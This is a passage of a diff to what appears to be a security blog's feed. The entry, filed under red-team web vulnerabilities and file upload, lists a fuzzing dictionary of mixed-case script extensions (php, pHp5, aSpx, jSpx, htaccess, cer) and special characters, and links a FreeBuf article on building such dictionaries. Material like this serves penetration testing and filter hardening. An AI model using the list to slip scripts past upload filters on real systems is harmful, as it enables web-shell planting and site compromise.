+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[&#39;php&#39;,&#39;phtml&#39;,&#39;php5&#39;,&#39;php4&#39;,&#39;php3&#39;,&#39;php2&#39;,&#39;php1&#39;,&#39;html&#39;,&#39;htm&#39;,&#39;phtml&#39;,&#39;pHp&#39;,&#39;pHp5&#39;,&#39;pHp4&#39;,&#39;pHp3&#39;,&#39;pHp2&#39;,&#39;pHp1&#39;,&#39;Html&#39;,&#39;Htm&#39;,&#39;pHtml&#39;,&#39;jsp&#39;,&#39;jspa&#39;,&#39;jspx&#39;,&#39;jsw&#39;,&#39;jsv&#39;,&#39;jspf&#39;,&#39;jtml&#39;,&#39;jSp&#39;,&#39;jSpx&#39;,&#39;jSpa&#39;,&#39;jSw&#39;,&#39;jSv&#39;,&#39;jSpf&#39;,&#39;jHtml&#39;,&#39;asp&#39;,&#39;aspx&#39;,&#39;asa&#39;,&#39;asax&#39;,&#39;ascx&#39;,&#39;ashx&#39;,&#39;asmx&#39;,&#39;cer&#39;,&#39;aSp&#39;,&#39;aSpx&#39;,&#39;aSa&#39;,&#39;aSax&#39;,&#39;aScx&#39;,&#39;aShx&#39;,&#39;aSmx&#39;,&#39;cEr&#39;,&#39;sWf&#39;,&#39;swf&#39;,&#39;htaccess&#39;,&#39;ini&#39;,&#39;inc&#39;, &quot;pht&quot;, &quot;jsp&quot;, &quot;jspa&quot;, &quot;jspx&quot;,&quot;&lt;&quot;,&quot;&gt;&quot;,&quot;jsw&quot;, &quot;jsv&quot;, &quot;jspf&quot;,&quot;jtml&quot;, &quot;asp&quot;, &quot;aspx&quot;, &quot;asa&quot;, &quot;asax&quot;, &quot;ascx&quot;, &quot;ashx&quot;, &quot;asmx&quot;, &quot;cer&quot;,&quot;&#123;&quot;,&quot;&#125;&quot;, &quot;swf&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
+<li><a href="https://www.freebuf.com/articles/web/188464.html">构造优质上传漏洞Fuzz字典</a></li>
+</ul>
+]]></content>
+      <categories>
+        <category>Red</category>
+        <category>常见web漏洞</category>
+      </categories>
+      <tags>
+        <tag>web安全</tag>
+        <tag>文件上传</tag>
       </tags>
   </entry>
   <entry>
